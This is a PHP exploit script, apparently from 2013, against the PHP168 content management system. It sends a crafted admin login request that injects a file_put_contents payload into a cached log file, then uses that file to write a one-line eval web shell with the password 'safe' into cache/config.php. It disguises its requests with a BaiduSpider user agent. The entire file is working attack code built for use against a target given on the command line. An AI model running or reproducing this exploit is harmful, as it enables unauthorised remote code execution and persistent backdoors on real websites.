<?php
/**
 * Created by 独自等待
 * Date: 13-11-19
 * Time: 下午5:46
 * Name: php168_codeexec.php
 * 独自等待博客：http://www.waitalone.cn/
 */
print_r('
+------------------------------------------------------+
                PHP168 Code_Exec EXP
             Site：http://www.waitalone.cn/
                Exploit BY： 独自等待
                  Time：2013-11-19
+------------------------------------------------------+
');
if ($argc < 3) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path
Host: target server (ip/hostname)
Path: path of php168
Example: php ' . $argv[0] . ' localhost /php168
+------------------------------------------------------+
    ');
    exit;
}
error_reporting(7);
//set_time_limit(30);
$host = $argv[1];
$path = $argv[2];
$exec = 'loginname=admin&loginpwd=${@file_put_contents($_GET[f],$_GET[s])}';
if (@fopen("http://$host/$path/cache/adminlogin_logs.php", 'r')) {
    echo '正在GetShell,请稍候……' . "\n\n";
    send_pack($exec);
    get_shell();
} else {
    exit('报告大爷，网站不存在此漏洞！');
}
//写入木马函数
function get_shell()
{
    global $host, $path;
    $shell_url = "http://$host/$path/cache/adminlogin_logs.php?f=config.php&s=<?php%20@eval(\$_POST[safe])?>";
    @file_get_contents($shell_url);
    $shell = "http://$host/$path/cache/config.php";
    if (@fopen($shell, 'r')) {
        echo '恭喜大爷，一句话写入成功，密码为：safe' . "\n\n" . 'Shell地址为：' . $shell . "\n";
    } else {
        echo 'Shell写入失败，请更换路径测试！' . "\n";
    }
}

//发送数据包函数
function send_pack($code)
{
    global $host, $path;
    $data = "POST " . $path . "/admin/index.php HTTP/1.1\r\n";
    $data .= "Host: $host\r\n";
    $data .= "User-Agent: BaiduSpider\r\n";
    $data .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $data .= "Content-Length: " . strlen($code) . "\r\n";
    $data .= "Connection: Close\r\n\r\n";
    $data .= $code . "\r\n";
    //echo $data;exit;
    $fp = @fsockopen($host, 80, $errno, $errstr, 30);
    //echo ini_get('default_socket_timeout');//默认超时时间为60秒
    if (!$fp) {
        echo $errno . '-->' . $errstr . "\n";
        exit('Could not connect to: ' . $host);
    } else {
        fwrite($fp, $data);
        $back = '';
        while (!feof($fp)) {
            $back .= fread($fp, 1024);
        }
        fclose($fp);
    }
    return $back;
}

?>
